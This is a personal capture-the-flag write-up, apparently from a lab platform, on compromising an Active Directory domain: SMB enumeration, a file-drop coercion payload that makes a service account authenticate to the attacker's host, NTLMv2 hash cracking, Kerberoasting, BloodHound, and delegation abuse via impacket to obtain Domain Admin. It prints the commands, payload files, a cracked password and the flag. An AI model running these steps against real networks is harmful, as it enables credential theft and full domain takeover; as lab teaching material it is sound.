@@ -1,1 +1,72 @@
+## Active Directory CTF Write‑Up ##
+This challenge walks through SMB Enumeration -> File-Based Coercion Attack -> Cracking NTLMv2 hash -> abusing AllowedToDelegate privilege to obtain Domain Admin access
 
+# Environment Setup:
+machine_IP = 10.114.142.161
+Before starting enumeration, DNS resolution must point to the Domain Controller. Kerberos relies heavily on proper hostname resolution, and it's always good practice for AD environments 
+
+1. `nmap -sn 10.114.142.0/24 -T4`    to discover live hosts
+
+2. `nmap -sV -sC 10.114.142.161 -oN full_scan.txt`   port scan
+	![[Pasted image 20260827163857.png]]
+
+3. SMB Shares Enumeration:
+	 i tried smbmap, nmap's smb_enum_shares, enum4linux-ng -> nothing worked
+	then i used smbclient and it worked: 
+		`smbclient -L //10.114.142.161/ -N`
+		![[Pasted image 20260827164709.png]] 
+	- then i had to connect to each share -> and discovered that i had read/write access to IT-Shared along with some interesting information:
+		`smbclient //10.114.142.161/IT-Shared -N`
+		![[Pasted image 20260827165154.png]]
+		
+now since i have write access, and the file share hints that svc.scanner service account enumerates IT-Shared share for new files to process, that indicates a possible  "File-Based Coercion Attack".
+
+1. i spin up a listener using responder
+	`sudo responder -I tun0`  
+
+2. i tried to upload  @test.url file with this syntax, but it didn't work
+	[InternetShortcut]
+	URL=http://thm.loc
+	WorkingDirectory=thm
+	IconFile=\\YOURTUN0IP\icons\icon.ico      
+	IconIndex=1
+
+3. i tried another file type @test.ps1 with this syntax:   ~~the @ is to make the file at the top~~
+	`Test-Path \\192.168.157.253\icons\icon.ico`
+	and in just seconds i intercepted and received an SMB authentication request from svc.scanner account containing his NTLMv2 hash.
+	![[Pasted image 20260827171310.png]]
+
+Cracking the captured NTLMv2 hash:
+	1. i saved the hash to hash.txt file
+	2. `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force` 
+	the password is: 1summerlove!
+
+
+[[Kerberoasting]]
+1. `impacket/GetUserSPNs.py ctf.local/svc.scanner -dc-ip 10.114.142.161 -request`
+	i got the TGS-REP blob for svc.mssql
+	![[Pasted image 20260827195245.png]]
+	i tried to crack it using hashcat, but unfortunately, no results
+
+BloodHound
+1. collect information
+	`bloodhound-python -c all -u svc.scanner -p 1summerlove! -d ctf.local -ns 10.114.151.84 --zip`
+
+2. run bloodhound & import the zip file
+	`bloodhound-start`  login with admin admin
+	![[Screenshot 2026-08-28 024159.png]]
+
+We found that svc.scanner has "AllowedToDelegate" privilege over the DC "DC01.CTF.LOCAL" 
+[[AllowedToDelegate privilege]]: Allows you to impersonate another user and request a service ticket (TGS) on behalf of him.
+so we request a service ticket for CIFS (the service giving the DC file-system access)
+
+we found hints on how to exploit this "AllowedToDelegate execution privilege" in the Linux abuse tab:
+	![[Pasted image 20260828030627.png]]
+	we follow along and GG, this demonstrate the power of [[BloodHound]]
+	1. `impacket/getST.py ctf.local/svc.scanner -spn cifs/DC01.CTF.LOCAL -impersonate 'Administrator'` 
+		-this will give us the TGS of cifs (the service controlling the DC's file-system) or in other words, Administrator TGT stored in a ccache file              IDK how   (:
+		-also note you need to edit /etc/resolv.conf or /etc/hosts for hostname resolution 
+	2. `export KRB5CCNAME=<path_to_ccache_file>`
+		
+	3. `impcket/psexec.py ctf.local/Administrator@DC01.CTG.LOCAL -k -no-pass`
+THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}
